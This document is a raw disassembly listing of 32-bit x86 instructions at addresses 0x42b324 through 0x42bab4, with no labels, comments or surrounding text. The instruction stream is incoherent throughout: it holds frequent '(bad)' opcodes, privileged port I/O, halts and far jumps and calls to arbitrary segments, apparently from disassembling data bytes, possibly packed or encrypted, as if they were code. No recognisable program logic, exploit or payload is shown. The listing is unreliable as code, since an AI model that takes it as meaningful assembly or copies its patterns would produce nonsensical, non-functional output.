  42b324:	adc    ah,BYTE PTR [ebx+0x43]
  42b327:	push   ebx
  42b328:	adc    esi,eax
  42b32a:	mov    ss,WORD PTR [eax+0x5e]
  42b32d:	idiv   esi
  42b32f:	xor    al,0xf9
  42b331:	sub    bh,al
  42b333:	imul   esp,DWORD PTR [eax-0x4b0b85f4],0xda56c70
  42b33d:	sbb    eax,0x38684bf6
  42b342:	jmp    DWORD PTR [edx]
  42b344:	fcom   DWORD PTR ds:0xb342e686
  42b34a:	add    eax,0xae1a320d
  42b34f:	out    0x75,eax
  42b351:	enter  0xc582,0x5a
  42b355:	and    BYTE PTR [eax],dl
  42b357:	loopne 0x42b383
  42b359:	sub    al,0xc0
  42b35b:	jb     0x42b3ce
  42b35d:	push   eax
  42b35e:	ret    
  42b35f:	(bad)  
  42b360:	pusha  
  42b361:	mov    dl,0xec
  42b363:	xor    ah,BYTE PTR [esp+esi*4-0x49]
  42b367:	je     0x42b39f
  42b369:	stos   BYTE PTR es:[edi],al
  42b36a:	test   BYTE PTR [eax+0x3d],0xcc
  42b36e:	loopne 0x42b30e
  42b370:	push   0x5c
  42b372:	dec    esp
  42b373:	nop
  42b374:	rcr    BYTE PTR [edi+0x35dac1b5],cl
  42b37a:	cli    
  42b37b:	cmp    BYTE PTR [edx-0x603761a2],0xc8
  42b382:	test   al,0xf4
  42b384:	ret    
  42b385:	(bad)  
  42b386:	inc    esp
  42b387:	sbb    eax,0x88bc74b4
  42b38c:	(bad)  
  42b38d:	push   ss
  42b38e:	imul   BYTE PTR [ebp+0x16fa00c2]
  42b394:	ss jbe 0x42b3fb
  42b397:	fsubr  QWORD PTR [edx-0x11]
  42b39a:	jle    0x42b3fd
  42b39c:	test   DWORD PTR [ecx+0x586a159a],ebp
  42b3a2:	(bad)  
  42b3a3:	pop    ecx
  42b3a4:	rol    BYTE PTR [ebx+eax*1],0xa
  42b3a8:	int    0xdf
  42b3aa:	shl    BYTE PTR [esi-0x30],1
  42b3ad:	add    BYTE PTR ds:[si+0xe7],bh
  42b3b3:	out    dx,al
  42b3b4:	je     0x42b407
  42b3b6:	adc    eax,0x40278ada
  42b3bb:	ja     0x42b3fd
  42b3bd:	repz sub ebx,esp
  42b3c0:	sbb    BYTE PTR [edx-0x15bc7976],0x6d
  42b3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3c8:	nop
  42b3c9:	js     0x42b3fd
  42b3cb:	inc    edx
  42b3cc:	mov    ss,edi
  42b3ce:	xchg   ebp,eax
  42b3cf:	mov    ch,0xd9
  42b3d1:	jp     0x42b370
  42b3d3:	mov    al,ds:0xb8a56f2e
  42b3d8:	repnz xor al,BYTE PTR [eax-0x6b]
  42b3dc:	arpl   WORD PTR [edi-0x24],ax
  42b3df:	jle    0x42b44a
  42b3e1:	call   0xdb81:0x50292aa8
  42b3e8:	sub    dl,al
  42b3ea:	xchg   edx,eax
  42b3eb:	rcr    BYTE PTR fs:[ecx+eax*8],cl
  42b3ef:	(bad)  
  42b3f0:	(bad)  
  42b3f1:	les    eax,FWORD PTR [eax-0x54]
  42b3f4:	add    BYTE PTR [ebp+edi*4+0x77],bh
  42b3f8:	jecxz  0x42b3b9
  42b3fa:	xor    al,0xf0
  42b3fc:	out    dx,al
  42b3fd:	mov    al,0x6e
  42b3ff:	ds mov bl,0xa2
  42b402:	add    BYTE PTR [edx-0x3c],dl
  42b405:	add    BYTE PTR ds:0xb540abb6,bh
  42b40b:	sub    al,BYTE PTR [ebx+0x7]
  42b40e:	xchg   esi,eax
  42b40f:	inc    edx
  42b410:	push   0x28bee37a
  42b415:	push   esp
  42b416:	dec    ebp
  42b417:	or     eax,0x30b63780
  42b41c:	leave  
  42b41d:	ret    0x76d0
  42b420:	cmp    BYTE PTR [esi],al
  42b422:	adc    dl,BYTE PTR [ecx]
  42b424:	mov    edi,0x8d6e6816
  42b429:	inc    ebp
  42b42a:	sbb    eax,0xe084e242
  42b42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b430:	push   esi
  42b431:	inc    ebp
  42b432:	cmp    ebx,DWORD PTR [edx]
  42b434:	or     al,0x1f
  42b436:	push   esi
  42b437:	pop    edi
  42b438:	push   cs
  42b439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b43a:	je     0x42b3bc
  42b43c:	test   BYTE PTR [ecx+0x13593653],ah
  42b442:	add    al,0xfc
  42b444:	into   
  42b445:	imul   edi,DWORD PTR [eax-0x66104172],0x57
  42b44c:	cld    
  42b44d:	xchg   esp,eax
  42b44e:	mov    eax,0x4146901c
  42b453:	add    BYTE PTR [ebx],bl
  42b455:	aad    0xd1
  42b457:	adc    DWORD PTR [eax+0x1ead28aa],esi
  42b45d:	pop    ecx
  42b45e:	fwait
  42b45f:	mov    esi,0x51a20f6
  42b464:	ins    DWORD PTR es:[edi],dx
  42b465:	push   ebp
  42b466:	inc    esi
  42b467:	mov    ah,BYTE PTR [ebx+0x2ac8883d]
  42b46d:	retf   
  42b46e:	cs test al,0xcd
  42b471:	pop    edx
  42b472:	cli    
  42b473:	bound  eax,QWORD PTR [ebp-0x7d]
  42b476:	pusha  
  42b477:	jbe    0x42b461
  42b479:	mov    al,0x5f
  42b47b:	ficom  DWORD PTR [eax]
  42b47d:	or     esp,DWORD PTR [esi+0x4cb076a4]
  42b483:	adc    dh,BYTE PTR [ebp+0x682aa8e9]
  42b489:	inc    esp
  42b48a:	xchg   edi,eax
  42b48b:	sbb    bl,bl
  42b48d:	test   dl,ch
  42b48f:	nop
  42b490:	js     0x42b4d9
  42b492:	imul   esi,DWORD PTR [edi-0x71c6014a],0xffffffbf
  42b499:	lods   al,BYTE PTR ds:[esi]
  42b49a:	lods   al,BYTE PTR ds:[esi]
  42b49b:	add    BYTE PTR [edi+0x40],ah
  42b49e:	enter  0xa2be,0x1e
  42b4a2:	mov    esp,0x2468db36
  42b4a7:	in     eax,dx
  42b4a8:	and    DWORD PTR [eax],edx
  42b4aa:	scas   eax,DWORD PTR es:[edi]
  42b4ab:	out    dx,al
  42b4ac:	jl     0x42b4bf
  42b4ae:	test   al,0x9e
  42b4b0:	add    BYTE PTR [edx-0x77cf987c],cl
  42b4b6:	rcl    BYTE PTR ds:0xbc248f15,0x66
  42b4bd:	inc    esp
  42b4be:	fmul   QWORD PTR [ecx+esi*4]
  42b4c1:	mov    DWORD PTR [esi+0x7e02df68],ecx
  42b4c7:	add    bl,BYTE PTR [edi+esi*1-0x3848598]
  42b4ce:	pop    edi
  42b4cf:	xor    edx,DWORD PTR [eax]
  42b4d1:	dec    edx
  42b4d2:	mov    BYTE PTR [edx],cl
  42b4d4:	or     ebx,DWORD PTR [edi]
  42b4d6:	imul   eax,DWORD PTR [eax],0xffffffdc
  42b4d9:	jmp    0x42b4db
  42b4db:	pop    eax
  42b4dc:	retf   
  42b4dd:	ss cwde 
  42b4df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4e0:	inc    esi
  42b4e1:	push   esi
  42b4e2:	outs   dx,BYTE PTR ds:[esi]
  42b4e3:	sub    al,0x19
  42b4e5:	or     cl,BYTE PTR [eax]
  42b4e7:	add    eax,0x78b44a55
  42b4ec:	xor    DWORD PTR [esi],0x834a5c7e
  42b4f2:	push   0x66
  42b4f4:	pusha  
  42b4f5:	mov    edx,0xd1700432
  42b4fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4fb:	jne    0x42b4cf
  42b4fd:	push   ss
  42b4fe:	sbb    al,0x62
  42b500:	mov    DWORD PTR [eax+0x4b001644],ecx
  42b506:	mov    ah,0x2f
  42b508:	mov    ds:0x1ccd4e59,al
  42b50d:	in     al,0x3e
  42b50f:	dec    eax
  42b510:	push   edx
  42b511:	sbb    eax,DWORD PTR [ebp+0x7c028682]
  42b517:	xlat   BYTE PTR ds:[ebx]
  42b518:	sahf   
  42b519:	call   0x1a6ce63c
  42b51e:	or     BYTE PTR ds:0x413bcba,dl
  42b524:	pop    es
  42b525:	mov    eax,ds:0x4cc86205
  42b52a:	pop    eax
  42b52b:	dec    esi
  42b52c:	mov    ch,0x71
  42b52e:	pop    ds
  42b52f:	pop    eax
  42b530:	push   esp
  42b531:	icebp  
  42b532:	nop
  42b533:	push   ecx
  42b534:	push   ss
  42b535:	out    dx,eax
  42b536:	loopne 0x42b503
  42b538:	jmp    0xa29feae3
  42b53d:	push   cs
  42b53e:	or     DWORD PTR [edx],ecx
  42b540:	xor    esp,eax
  42b542:	fidiv  DWORD PTR [edi-0x53f1c565]
  42b548:	mov    ds:0xf136b38e,al
  42b54d:	sbb    al,0xa2
  42b54f:	cmp    eax,0x87db605
  42b554:	push   0xffffff80
  42b556:	retf   0x34ba
  42b559:	add    al,0xb4
  42b55b:	ds inc edi
  42b55d:	sub    esi,DWORD PTR [eax]
  42b55f:	inc    ecx
  42b560:	es push ds
  42b562:	inc    esp
  42b563:	or     ch,ah
  42b565:	rcl    BYTE PTR [ebx],cl
  42b567:	test   DWORD PTR fs:[edx+0x12],eax
  42b56b:	mov    esp,0x74e6a66d
  42b570:	push   ebp
  42b571:	fadd   DWORD PTR [edx]
  42b573:	js     0x42b59a
  42b575:	xchg   edx,eax
  42b576:	push   ss
  42b577:	or     bh,BYTE PTR [esi+edi*8]
  42b57a:	ficom  WORD PTR [ebp+0x14]
  42b57d:	push   ebp
  42b57e:	adc    al,0xde
  42b580:	pop    edx
  42b581:	sar    BYTE PTR [ebp-0x5c],1
  42b584:	test   esp,0x5111e88f
  42b58a:	add    eax,0x7692735e
  42b58f:	call   0xaa36:0x231257ac
  42b596:	scas   eax,DWORD PTR es:[edi]
  42b597:	clc    
  42b598:	add    ah,ah
  42b59a:	lods   eax,DWORD PTR ds:[esi]
  42b59b:	rcl    DWORD PTR [esi+0x9],0xac
  42b59f:	dec    esi
  42b5a0:	or     BYTE PTR [ecx+0x22],dl
  42b5a3:	clc    
  42b5a4:	sub    eax,0xe3add846
  42b5a9:	pop    es
  42b5aa:	test   edx,ebx
  42b5ac:	in     al,0xb6
  42b5ae:	adc    al,BYTE PTR [eax]
  42b5b0:	lahf   
  42b5b1:	mov    BYTE PTR [ebp+0x15004bc0],dl
  42b5b7:	call   0xc14f1215
  42b5bc:	mov    al,0xa8
  42b5be:	jmp    0xd66fbe1b
  42b5c3:	inc    edx
  42b5c4:	push   eax
  42b5c5:	sub    eax,eax
  42b5c7:	icebp  
  42b5c8:	inc    ebx
  42b5c9:	cmp    eax,0xb866ca6
  42b5ce:	call   0x4e4395e9
  42b5d3:	xor    eax,0x4cb32833
  42b5d8:	xchg   BYTE PTR [edx],ah
  42b5da:	pusha  
  42b5db:	push   ecx
  42b5dc:	inc    ebp
  42b5dd:	mov    al,ds:0xad70215
  42b5e2:	mov    al,0xa0
  42b5e4:	pop    es
  42b5e5:	adc    DWORD PTR [ebx+0x1cae31e2],ebx
  42b5eb:	mov    al,BYTE PTR [edx-0x3f9554d2]
  42b5f1:	sub    ah,BYTE PTR [edi*1+0x64787610]
  42b5f8:	add    al,0x56
  42b5fa:	(bad)  
  42b5fc:	lods   eax,DWORD PTR ds:[esi]
  42b5fd:	fdiv   st,st(5)
  42b5ff:	push   edx
  42b600:	hlt    
  42b601:	xor    eax,DWORD PTR [eax]
  42b603:	cmp    eax,esi
  42b605:	add    BYTE PTR [ebp+0x36f4f473],ah
  42b60b:	sub    ch,BYTE PTR [esi-0x4069a05c]
  42b611:	cmp    ah,ah
  42b613:	lods   al,BYTE PTR ds:[esi]
  42b614:	jbe    0x42b5d3
  42b616:	cmp    ebp,DWORD PTR [edx-0x50f5d5d6]
  42b61c:	loop   0x42b623
  42b61e:	or     al,0x84
  42b620:	sub    ah,BYTE PTR [ecx]
  42b622:	dec    ecx
  42b623:	xlat   BYTE PTR ds:[ebx]
  42b624:	mov    ah,BYTE PTR [ebx]
  42b626:	add    dl,BYTE PTR [esi+0x6c434c56]
  42b62c:	repnz rol BYTE PTR [esi-0x2bf9d55a],0xfa
  42b634:	scas   al,BYTE PTR es:[edi]
  42b635:	mov    esp,0x891693be
  42b63a:	dec    esp
  42b63b:	and    BYTE PTR [edx+0x78],ch
  42b63e:	es cwde 
  42b640:	or     BYTE PTR [esi],0x91
  42b643:	inc    edi
  42b644:	push   0xfffffffb
  42b646:	mov    dh,0x1c
  42b648:	das    
  42b649:	dec    esp
  42b64a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b64b:	xor    eax,0x428bedda
  42b650:	(bad)  
  42b651:	in     al,dx
  42b652:	pushf  
  42b653:	inc    edx
  42b654:	pusha  
  42b655:	xchg   BYTE PTR [edi],bl
  42b657:	out    dx,al
  42b658:	test   eax,0x150d8a09
  42b65d:	mov    dl,0x69
  42b65f:	push   eax
  42b660:	sbb    edi,0xffffff82
  42b663:	or     al,BYTE PTR ds:0x99a6468a
  42b669:	fsub   QWORD PTR [esi-0x5e]
  42b66c:	(bad)
  42b670:	push   0xa
  42b672:	shl    BYTE PTR [eax],cl
  42b674:	cs pop ecx
  42b676:	js     0x42b622
  42b678:	int3   
  42b679:	add    al,0x44
  42b67b:	adc    al,0xae
  42b67d:	push   ds
  42b67e:	stos   BYTE PTR es:[edi],al
  42b67f:	xchg   BYTE PTR [ebx],ah
  42b681:	add    BYTE PTR [ebx+0x74cc9abc],cl
  42b687:	xchg   ebp,eax
  42b688:	mov    al,0x76
  42b68a:	jne    0x42b6c1
  42b68c:	fcom   DWORD PTR [edi+0x2702043c]
  42b692:	mov    WORD PTR [eax+0x2cc7e7bc],?
  42b698:	push   0x523acd8e
  42b69d:	mov    edx,0xc5c4424c
  42b6a2:	nop
  42b6a3:	popf   
  42b6a4:	push   0x58
  42b6a6:	shr    DWORD PTR [esi+0x3abc5c2c],1
  42b6ac:	mov    edx,0x17e5cb8
  42b6b1:	add    BYTE PTR [ebx],0x1a
  42b6b4:	xchg   edx,eax
  42b6b5:	add    eax,0x96f85c9c
  42b6ba:	pop    edx
  42b6bb:	(bad)  
  42b6bc:	retf   0xdeca
  42b6bf:	lea    ebp,[edx]
  42b6c1:	push   ss
  42b6c2:	mov    DWORD PTR [edi+eiz*1],ebp
  42b6c5:	and    ah,bh
  42b6c7:	mov    esp,0x46a581f1
  42b6cc:	mov    ds:0x4ec20ac1,eax
  42b6d1:	inc    esp
  42b6d2:	in     al,0x2b
  42b6d4:	and    al,dl
  42b6d6:	push   ds
  42b6d7:	jmp    0xa69a:0x4c5ffaf5
  42b6de:	stos   DWORD PTR es:[edi],eax
  42b6df:	lds    eax,FWORD PTR ss:[edx]
  42b6e2:	cld    
  42b6e3:	xchg   DWORD PTR [esi-0x244fbae],eax
  42b6e9:	and    al,0xfc
  42b6eb:	add    BYTE PTR [edi+0x62],ch
  42b6ee:	imul   edi,esi,0xffffffb7
  42b6f1:	fadd   QWORD PTR [eax]
  42b6f3:	loope  0x42b767
  42b6f5:	add    BYTE PTR [esi+0x1],ch
  42b6f8:	mov    ?,edi
  42b6fa:	xchg   ebp,eax
  42b6fb:	nop
  42b6fc:	sub    DWORD PTR [esi-0x27839b1],0x828dff0
  42b706:	push   ebp
  42b707:	and    ch,BYTE PTR [ebx-0x28]
  42b70a:	je     0x42b774
  42b70c:	xor    DWORD PTR [eax+0x63],ebx
  42b70f:	dec    edx
  42b710:	outs   dx,BYTE PTR ds:[esi]
  42b711:	xor    ebp,DWORD PTR [esi+edi*1-0x3cdee537]
  42b718:	sti    
  42b719:	dec    esi
  42b71a:	mov    edx,fs
  42b71c:	jmp    0xb64364c7
  42b721:	mov    eax,ds:0xbada73d0
  42b726:	outs   dx,DWORD PTR ds:[esi]
  42b727:	cmp    dl,BYTE PTR [edx+0x74]
  42b72a:	jo     0x42b6dc
  42b72c:	lods   eax,DWORD PTR ds:[esi]
  42b72d:	xor    cl,BYTE PTR [eax]
  42b72f:	add    eax,0xc6a278c0
  42b734:	push   ebp
  42b735:	sahf   
  42b736:	mov    bl,BYTE PTR [esi]
  42b738:	or     DWORD PTR [ebx-0x226bdd78],ebx
  42b73e:	not    al
  42b740:	pop    ebp
  42b741:	adc    al,0x61
  42b743:	gs inc eax
  42b745:	dec    esp
  42b746:	cdq    
  42b747:	fs cwde 
  42b749:	call   0x5742:0xb6c0a2b6
  42b750:	mov    es,WORD PTR [ebp-0x66]
  42b753:	cs into 
  42b755:	js     0x42b717
  42b757:	dec    esp
  42b758:	xor    eax,0x5e5688d3
  42b75d:	adc    DWORD PTR [esi],ebp
  42b75f:	push   eax
  42b760:	mov    eax,ds:0xb9ca8aa
  42b765:	out    0xdb,al
  42b767:	rol    BYTE PTR [esi+ebp*8],0xdf
  42b76b:	pop    edx
  42b76c:	ins    BYTE PTR es:[edi],dx
  42b76d:	sub    bh,ah
  42b76f:	fstp   QWORD PTR [esi+0x3b]
  42b772:	mov    al,0x3a
  42b774:	rcr    al,cl
  42b776:	sub    BYTE PTR [edx],0x52
  42b779:	dec    ebx
  42b77a:	push   edx
  42b77b:	mov    al,0x4b
  42b77d:	and    dh,0x96
  42b780:	lods   al,BYTE PTR ds:[esi]
  42b781:	ins    BYTE PTR es:[edi],dx
  42b782:	xchg   esi,eax
  42b783:	inc    eax
  42b784:	adc    ah,BYTE PTR [ebp+ebp*8-0x3a]
  42b788:	mov    ds:0xd1aa82b5,al
  42b78d:	push   esp
  42b78e:	and    eax,0xd18ee630
  42b793:	push   ss
  42b794:	(bad)  [edx-0x2f3ebca6]
  42b79a:	jb     0x42b749
  42b79c:	es mov ebp,0xa2423728
  42b7a2:	aam    0x8a
  42b7a4:	inc    esp
  42b7a5:	sbb    edx,esp
  42b7a7:	clc    
  42b7a8:	mov    eax,ds:0x94a57a32
  42b7ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7ae:	or     DWORD PTR [ebx],edi
  42b7b0:	call   0x7316:0x6263c259
  42b7b7:	fisubr WORD PTR [esp+eiz*8]
  42b7ba:	dec    ebp
  42b7bb:	sub    al,0x40
  42b7bd:	hlt    
  42b7be:	xor    cl,BYTE PTR [edi+0x708cecad]
  42b7c4:	ret    
  42b7c5:	xchg   esp,eax
  42b7c6:	jns    0x42b77b
  42b7c8:	add    BYTE PTR [eax],dl
  42b7ca:	out    dx,eax
  42b7cb:	jmp    0x6d68:0x5e6b0046
  42b7d2:	xchg   ebx,eax
  42b7d3:	ret    
  42b7d4:	retf   0xd7a0
  42b7d7:	xor    eax,0x74ee3c5e
  42b7dc:	jmp    0xf128107a
  42b7e1:	push   ds
  42b7e2:	retf   
  42b7e3:	mov    ah,0x32
  42b7e5:	push   edi
  42b7e6:	pop    ds
  42b7e7:	lea    eax,[ebp-0x4a]
  42b7ea:	xchg   esp,eax
  42b7eb:	scas   al,BYTE PTR es:[edi]
  42b7ec:	and    eax,0xe4ca8cbe
  42b7f1:	add    bh,cl
  42b7f3:	mov    edx,0x69b0b1e
  42b7f8:	pop    es
  42b7f9:	call   0x38b97b13
  42b7fe:	fdiv   DWORD PTR [eax]
  42b800:	or     DWORD PTR [edx-0x3f],ebp
  42b803:	jbe    0x42b87f
  42b805:	xchg   BYTE PTR [ebx+0x10],al
  42b808:	add    ebp,eax
  42b80a:	pusha  
  42b80b:	xchg   BYTE PTR [edx],dl
  42b80d:	outs   dx,DWORD PTR ss:[esi]
  42b80f:	jmp    0x231c:0xa8d250
  42b816:	xchg   edx,eax
  42b817:	add    BYTE PTR [ecx-0x2e784185],cl
  42b81d:	push   cs
  42b81e:	aam    0xa6
  42b820:	mov    ds:0x7c887d72,eax
  42b825:	fiadd  DWORD PTR ds:0xe8360497
  42b82b:	stc    
  42b82c:	test   BYTE PTR [edx+0x75c54e6f],0xb4
  42b833:	pop    ebp
  42b834:	sbb    eax,0xd0b6ab3c
  42b839:	pop    eax
  42b83a:	fs aam 0x9c
  42b83d:	pop    ds
  42b83e:	dec    ebp
  42b83f:	cwde   
  42b840:	rol    DWORD PTR [eax-0x1b7703a2],1
  42b846:	and    BYTE PTR [eax],0x58
  42b849:	fisubr WORD PTR [ebp+0x1d1c3c03]
  42b84f:	not    bl
  42b851:	pop    eax
  42b852:	xchg   edx,eax
  42b853:	mov    ds:0x6661f076,eax
  42b858:	push   ss
  42b859:	lock jp 0x42b829
  42b85c:	in     al,dx
  42b85d:	push   edx
  42b85e:	dec    ebx
  42b85f:	rol    BYTE PTR [esi+0x3a34671d],1
  42b865:	xchg   ecx,eax
  42b866:	jne    0x42b871
  42b868:	mov    ch,0x55
  42b86a:	call   0x4534:0xcc380667
  42b871:	cmove  esp,DWORD PTR [edi-0x339db20e]
  42b878:	fwait
  42b879:	and    cl,dl
  42b87b:	call   0xf58:0xb8ebaa0d
  42b882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b884:	sbb    eax,0x3a5283d8
  42b889:	cmc    
  42b88a:	out    dx,al
  42b88b:	psrlw  mm1,QWORD PTR [ebx-0x6b]
  42b88f:	aam    0x18
  42b891:	jo     0x42b821
  42b893:	dec    ebx
  42b894:	stos   DWORD PTR es:[edi],eax
  42b895:	sub    BYTE PTR [eax],ch
  42b897:	jb     0x42b85f
  42b899:	ds jae 0x42b8cc
  42b89c:	in     al,dx
  42b89d:	inc    eax
  42b89e:	bound  ebp,QWORD PTR [esi]
  42b8a0:	mov    dh,0x8a
  42b8a2:	add    esp,DWORD PTR [edx+0x25]
  42b8a5:	shl    ah,0x11
  42b8a8:	push   0x4c
  42b8aa:	cli    
  42b8ab:	add    ebp,DWORD PTR [ebp+0x5]
  42b8ae:	std    
  42b8af:	adc    esp,0xffffffe2
  42b8b2:	ins    DWORD PTR es:[edi],dx
  42b8b3:	sahf   
  42b8b4:	pop    edx
  42b8b5:	cwde   
  42b8b6:	add    BYTE PTR [esi+0x2],bl
  42b8b9:	and    DWORD PTR [eax+0x51],ebx
  42b8bc:	jo     0x42b84c
  42b8be:	je     0x42b850
  42b8c0:	jns    0x42b892
  42b8c2:	out    0x14,al
  42b8c4:	js     0x42b907
  42b8c6:	pop    ebx
  42b8c7:	rcl    DWORD PTR [eax-0x1e],1
  42b8ca:	jl     0x42b8d4
  42b8cc:	jmp    0x42b8f6
  42b8ce:	push   eax
  42b8cf:	sbb    DWORD PTR [esp+eax*8],0x22550d7e
  42b8d6:	xor    eax,0x186ea86a
  42b8db:	jecxz  0x42b85d
  42b8dd:	push   ebx
  42b8de:	or     ch,BYTE PTR [esi-0x35b94bf8]
  42b8e4:	aaa    
  42b8e5:	sbb    al,0x9
  42b8e7:	mov    ah,0x2d
  42b8e9:	push   es
  42b8ea:	fcmovnbe st,st(4)
  42b8ec:	ror    dl,1
  42b8ee:	pushf  
  42b8ef:	loopne 0x42b881
  42b8f1:	sbb    al,0x32
  42b8f3:	mov    esp,0x45d0260a
  42b8f8:	cmp    BYTE PTR [ecx-0x4601ab1e],al
  42b8fe:	or     eax,0x4c11229a
  42b903:	repnz mov bl,0xbe
  42b906:	adc    esp,DWORD PTR [ebp-0x4f157d53]
  42b90c:	pop    ecx
  42b90d:	mov    ah,cl
  42b90f:	lea    edi,[esi-0x18]
  42b912:	add    al,0xf6
  42b914:	fidiv  DWORD PTR [ecx]
  42b916:	jle    0x42b922
  42b918:	push   cs
  42b919:	inc    eax
  42b91a:	jo     0x42b8b0
  42b91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b91d:	mov    al,ds:0x4c16cde4
  42b922:	push   ss
  42b923:	jmp    0x2e3:0xb5b3d4f4
  42b92a:	ds pusha 
  42b92c:	mov    ds:0xc178e4b2,al
  42b931:	mov    cs,WORD PTR [edi]
  42b933:	jmp    0x4614f08f
  42b938:	push   es
  42b939:	xchg   edi,eax
  42b93a:	mov    BYTE PTR [edx+0x2aadcd02],bh
  42b940:	mov    ds:0x1b827efb,al
  42b945:	add    ch,BYTE PTR [esi]
  42b947:	sub    DWORD PTR [edx],0x861c3876
  42b94d:	lds    esp,FWORD PTR [ebx]
  42b94f:	add    ecx,DWORD PTR [ebp+0xc]
  42b952:	pop    es
  42b953:	es inc esp
  42b955:	adc    BYTE PTR [eax],0xd2
  42b958:	push   esi
  42b959:	hlt    
  42b95a:	push   cs
  42b95b:	inc    edx
  42b95c:	hlt    
  42b95d:	xchg   DWORD PTR [eax],eax
  42b95f:	inc    edi
  42b960:	fisub  DWORD PTR [ebx]
  42b962:	adc    BYTE PTR [eax-0x7fec1eb0],0x5f
  42b969:	cmp    bh,ch
  42b96b:	mov    eax,ds:0xa8ce76a
  42b970:	shl    ah,1
  42b972:	add    BYTE PTR [esi-0x51],bl
  42b975:	push   edx
  42b976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b977:	(bad)  
  42b978:	(bad)  
  42b979:	inc    ebx
  42b97a:	arpl   WORD PTR [ecx],ax
  42b97c:	sub    ah,BYTE PTR [edi+ebx*2-0x54]
  42b980:	iret   
  42b981:	ins    BYTE PTR es:[edi],dx
  42b982:	fdiv   DWORD PTR [ebp-0x397d2657]
  42b988:	or     al,0x4e
  42b98a:	push   cs
  42b98b:	mov    BYTE PTR [eax-0x682a5f5a],ah
  42b991:	xor    BYTE PTR [ebp+0x2f1e54d0],0xe8
  42b998:	fadd   DWORD PTR [esi+0x36c0b66]
  42b99e:	or     BYTE PTR [ebx+0x29],ch
  42b9a1:	call   0x800a:0xf42a6afc
  42b9a8:	xlat   BYTE PTR ds:[ebx]
  42b9a9:	rol    BYTE PTR [edx+0x1cca424a],cl
  42b9af:	out    dx,al
  42b9b0:	retf   0x6048
  42b9b3:	(bad)  
  42b9b4:	addr16 pop ds
  42b9b6:	mov    eax,0xb168bc9
  42b9bb:	pop    edx
  42b9bc:	ss sub dh,ch
  42b9bf:	movups xmm3,XMMWORD PTR [esi-0x55]
  42b9c3:	mov    edx,0x2692342e
  42b9c8:	sbb    al,0x38
  42b9ca:	pop    ebx
  42b9cb:	ret    
  42b9cc:	adc    eax,0x89742784
  42b9d1:	mov    al,0xfd
  42b9d3:	or     dl,BYTE PTR [edx+0x436c3b63]
  42b9d9:	rol    DWORD PTR [eax],0x1a
  42b9dc:	ss ja  0x42ba59
  42b9df:	sahf   
  42b9e0:	sbb    BYTE PTR [eax-0x4c],0xb1
  42b9e4:	lods   eax,DWORD PTR ds:[esi]
  42b9e5:	xor    DWORD PTR [ebp+0x42c4081d],esi
  42b9eb:	inc    esi
  42b9ec:	stos   BYTE PTR es:[edi],al
  42b9ed:	lar    eax,WORD PTR [eax+0x51]
  42b9f1:	push   edi
  42b9f2:	aad    0x3c
  42b9f4:	mov    edx,0xec65c25c
  42b9f9:	push   ds
  42b9fa:	lods   eax,DWORD PTR ds:[esi]
  42b9fb:	sbb    eax,0x4798c8a1
  42ba00:	test   BYTE PTR [ebp+0x64],dl
  42ba03:	jmp    0x289c3796
  42ba08:	call   0xfd3d96bd
  42ba0d:	fdivr  st(6),st
  42ba0f:	push   esp
  42ba10:	add    al,0xbf
  42ba12:	and    DWORD PTR [esp+edx*4],edx
  42ba15:	scas   al,BYTE PTR es:[edi]
  42ba16:	cwde   
  42ba17:	fild   QWORD PTR [ecx+0x54]
  42ba1a:	(bad)  
  42ba1b:	shl    ecx,1
  42ba1d:	add    dl,BYTE PTR [esi+eax*1-0x17928704]
  42ba24:	push   esi
  42ba25:	mov    ah,0x8e
  42ba27:	mov    ah,BYTE PTR [ebx-0x48936e1e]
  42ba2d:	sub    bh,dl
  42ba2f:	dec    esp
  42ba30:	add    BYTE PTR [eax-0x354a7a3a],bl
  42ba36:	fs nop
  42ba38:	outs   dx,DWORD PTR ds:[esi]
  42ba39:	jl     0x42ba49
  42ba3b:	(bad)  
  42ba3c:	and    DWORD PTR [eax-0x1e493aac],esi
  42ba42:	pushf  
  42ba43:	dec    esp
  42ba44:	jne    0x42ba7a
  42ba46:	rcl    esi,1
  42ba48:	nop
  42ba49:	dec    edi
  42ba4a:	pop    esi
  42ba4b:	fld    QWORD PTR [edx+ebp*4+0x1660aaf4]
  42ba52:	inc    ebp
  42ba53:	or     eax,0x6310ad15
  42ba58:	push   edx
  42ba59:	fstp   QWORD PTR [edx+0x740cda07]
  42ba5f:	xchg   DWORD PTR [eax-0x3fafa10],esi
  42ba65:	mov    al,0xba
  42ba67:	retf   
  42ba68:	mov    DWORD PTR [eax],eax
  42ba6a:	push   edx
  42ba6b:	jg     0x42ba18
  42ba6d:	sub    dh,BYTE PTR [edx+0x7c]
  42ba70:	mov    esi,0x4ae42259
  42ba75:	gs or  al,0x3b
  42ba78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ba79:	dec    eax
  42ba7a:	int    0x2
  42ba7c:	pop    edx
  42ba7d:	fmul   DWORD PTR [esi+0x68855edf]
  42ba83:	(bad)  
  42ba84:	mov    al,0x7d
  42ba86:	dec    eax
  42ba87:	mov    edi,0x26a60a70
  42ba8c:	mov    WORD PTR [esi],gs
  42ba8e:	push   edx
  42ba8f:	jl     0x42baf1
  42ba91:	inc    ecx
  42ba92:	xchg   edi,eax
  42ba93:	inc    ecx
  42ba94:	mov    ch,BYTE PTR [esi-0x37]
  42ba97:	ins    BYTE PTR es:[edi],dx
  42ba98:	inc    eax
  42ba99:	icebp  
  42ba9a:	pop    ecx
  42ba9b:	sub    dh,BYTE PTR [eax]
  42ba9d:	adc    eax,0x9c9a3494
  42baa2:	dec    ebp
  42baa3:	inc    ebx
  42baa4:	xlat   BYTE PTR ds:[ebx]
  42baa5:	sub    ebp,DWORD PTR [edx+0x474e5fe]
  42baab:	push   edi
  42baac:	into   
  42baad:	lahf   
  42baae:	fidiv  DWORD PTR [eax-0x33a66d80]
  42bab4:	lods   al,BYTE PTR ds:[esi]
